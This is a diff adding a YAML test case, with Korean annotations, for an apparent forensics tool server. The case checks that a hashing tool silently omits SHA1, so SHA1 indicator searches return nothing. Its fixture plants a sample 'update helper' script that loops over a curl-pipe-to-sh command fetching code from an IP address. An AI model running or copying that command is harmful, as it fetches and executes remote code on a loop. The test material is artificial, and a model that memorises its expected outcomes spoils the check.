@@ -1,0 +1,64 @@
+# Matrix case P2049-100: run_hashdeep says it produces MD5, SHA1 and SHA256,
+# but runs hashdeep without -c, so only hashdeep's default MD5 and SHA256 are
+# indexed and a SHA1 IOC search finds nothing.
+case_id: P2049-100
+problem: P2049
+server: mulder
+variant: mulder-3164843
+commit: 3164843baf74c7fe69e7121dbd6150f8f77ce660
+display: source-vs-result
+level: mcp
+realism: common
+realism_ko: "위협 정보(IOC)는 SHA1로 주어지는 일이 흔하고, 도구 설명이 SHA1을 만든다고 하므로 hashdeep 결과에서 SHA1을 찾는 것은 자연스럽다."
+coverage: full
+summary: >-
+  run_hashdeep, described as generating MD5, SHA1 and SHA256, indexes only
+  MD5 and SHA256 for a dropped script (hashdeep's default set), so a search
+  for the script's SHA1 returns zero results while its SHA256 is found.
+summary_ko: "MD5·SHA1·SHA256을 만든다고 알리는 `run_hashdeep`이 떨어뜨려진 스크립트의 MD5·SHA256만 적재한다(hashdeep 기본값). 그래서 그 파일의 SHA1을 찾으면 0건이고 SHA256은 찾힌다."
+defect_ko: "이 서버는 hashdeep을 `-c` 없이 실행해 기본값인 MD5·SHA256만 만든다. 설명대로라면 `-c md5,sha1,sha256`으로 SHA1도 만들어야 한다. 모델은 SHA1 IOC 검색 0건을 '그 파일이 없다'로 잘못 안다."
+setup_ko: "`/tmp`에 떨어뜨려진 셸 스크립트 하나(`.update.sh`)를 증거 폴더에 넣었다. 그 파일의 SHA1은 69e56207…, SHA256은 2472d57b…이다."
+fixture:
+  - path: tmp/.update.sh
+    # md5 361debe48f71d6a3ef653114e971a6e3
+    # sha1 69e56207fad183873753061b1fc1ff7594163fb2
+    # sha256 2472d57b6206e29ebb8682879779691c6ef499c24463b10bbdb2f21aa0085db5
+    text: "#!/bin/sh\n# system update helper\nwhile true; do\n  curl -fsS http://203.0.113.7/k.sh | sh\n  sleep 600\ndone\n"
+    mode: "0755"
+steps:
+  - tool: scan_evidence
+    note_ko: "사건 만들기"
+    args:
+      evidence_path: ${EVIDENCE}
+      case_id: hashdeep-sha1
+  - tool: run_hashdeep
+    note_ko: "결함 호출: 증거 폴더 해시 계산"
+    args:
+      target_path: ${EVIDENCE}
+  - tool: search
+    note_ko: "결함 호출: 파일의 SHA1을 hashdeep 결과에서 찾기"
+    args:
+      query: 69e56207fad183873753061b1fc1ff7594163fb2
+      source: hashdeep.hashes
+  - tool: search
+    note_ko: "비교 호출: 같은 파일의 SHA256을 찾기"
+    args:
+      query: 2472d57b6206e29ebb8682879779691c6ef499c24463b10bbdb2f21aa0085db5
+      source: hashdeep.hashes
+  - tool: get_raw_output
+    note_ko: "비교 호출: 적재된 hashdeep 출력 원문"
+    args:
+      source_name: hashdeep.hashes
+expect:
+  - step: 2
+    note_ko: "hashdeep 실행이 성공으로 돌아온다"
+    regex: '"status": "success"'
+  - step: 5
+    note_ko: "적재된 출력의 열이 size, md5, sha256, filename뿐이다(SHA1 열이 없다)"
+    contains: "size,md5,sha256,filename"
+  - step: 4
+    note_ko: "같은 파일의 SHA256은 찾힌다"
+    contains: "2472d57b6206e29ebb8682879779691c6ef499c24463b10bbdb2f21aa0085db5"
+  - step: 3
+    note_ko: "SHA1 검색은 오류 없이 0건으로 돌아온다"
+    regex: '"total_matches": 0\b'
